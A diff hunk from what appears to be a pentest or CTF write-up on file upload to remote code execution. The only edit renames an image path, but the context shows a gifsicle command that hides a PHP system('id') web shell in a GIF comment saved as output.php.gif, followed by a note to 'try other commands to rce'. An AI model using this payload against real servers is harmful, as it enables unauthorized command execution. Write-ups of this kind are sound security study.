@@ -67,7 +67,7 @@ gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
 
 Go to that path and get some interesting things:
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (2).png>)
 
 * It works, try other commands to rce :
 
